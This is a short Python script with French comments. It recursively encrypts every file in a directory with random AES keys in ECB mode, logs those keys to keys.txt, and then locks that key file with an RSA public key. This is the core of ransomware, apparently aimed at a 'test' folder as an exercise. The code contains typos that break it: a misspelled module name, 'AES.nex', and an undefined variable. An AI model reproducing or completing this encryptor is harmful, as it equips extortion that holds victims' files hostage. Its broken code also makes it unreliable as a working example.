from Crypto.PubliKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
import base64, os


CURDIR = os.path.dirname(os.path.realpath(__file__))

# Fonction chiffre fichier avec AES
def enc_file(file_path):
    #Génère clé AES aléatoire
    aes_key = get_random_bytes(32)

    #Lit contenu fichier
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    #Ajout padding si nécessaire
    padding_lenght = 16 - (len(plaintext) % 16)
    plaintext += bytes([padding_lenght]) * padding_lenght

    #Chiffre avec AES mode ECB
    cipher = AES.nex(aes_key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)

    #Sauvegarde fichier chiffré avec .enc
    enc_file_path = file_path + ".enc"
    with open(enc_file_path, 'wb') as f:
        f.write(ciphertext)

    #Ajoute la clé à keys.txt
    with open(f"{CURDIR}/keys.txt", 'a') as key_file:
        key_file.write(f"{enc_file_patj}:{base64.b64encode(aes_key).decode()}\n")

#############################@@@@###########################################################

#Fonction parcourt répertoire et chiffre tous les fichiers
def search_dir(directory):
    directory = f"{CURDIR}/{directory}"
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            enc_file(file_path)

    #Charge la clé public
    with open(f"{CURDIR}/key.public", 'rb') as f:
        public_key = RSA.import_key(f.read())

    #Lit keys.txt
    with open(f"{CURDIR}/keys.txt", 'rb') as f:
        keys_content = f.read()

    #Chiffre keys.txt en blocs compatibles RSA
    cipher_rsa = PKCS1_OAEP.new(public_key)

    chunk_size = 190 # Taille compatible RSA (2048 - padding overhead)
    encrypted_chunks = [cipher_rsa.encrypt(keys_content[i:i + chunk_size]) for i in range(0, len(keys_content), chunk_size)]

    #Sauvegarde le fichier chiifré
    with open(f"{CURDIR}/keys.txt.enc", 'wb') as f:
        for chunk in encrypted_chunks:
            f.write(chunk)

if __name__ == "__main__":
    search_dir("test")
    print("Chiffrement terminé.")



